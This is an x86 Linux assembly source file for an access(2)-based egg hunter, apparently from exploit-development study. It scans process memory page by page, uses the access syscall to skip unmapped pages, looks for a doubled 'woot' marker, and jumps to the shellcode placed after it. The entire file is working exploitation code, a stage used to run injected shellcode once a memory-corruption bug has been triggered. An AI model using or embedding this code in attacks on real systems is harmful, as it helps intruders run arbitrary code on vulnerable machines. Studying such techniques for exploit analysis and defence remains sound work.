global _start
 
section .text
 
_start:

    ; 
    ; access(2) code block
    ;
    cld                   ; make sure direction flag is NOT set
    xor edx,edx           ; initialize EDX register

nxt_page:                 ; increment page
    or dx,0xfff           ; first page alignment

nxt_addr:
    inc edx               ; increment address
    lea ebx,[edx+0x4]     ; load pointer with 8-bytes egg hunter
    push byte 0x21        ; #define __NR_access 33
    pop eax               ; load EAX
    int 0x80              ; ping kernel!
    cmp al,0xf2           ; check for EFAULT
    jz nxt_page           ; if yes go back to nxt_page
    mov eax,0x776f6f74    ; egg = woot
    mov edi,edx           ; save pointer address to EDI
    scasd                 ; compare EAX[woot] with EDI[????] first 4 bytes  
    jnz nxt_addr          ; if no go back to nxt_addr
    scasd                 ; compare EAX[woot] with EDI+4[????] second 4 bytes
    jnz nxt_addr          ; if no go back to nxt_addr
    jmp edi               ; go to the start of our shellcode
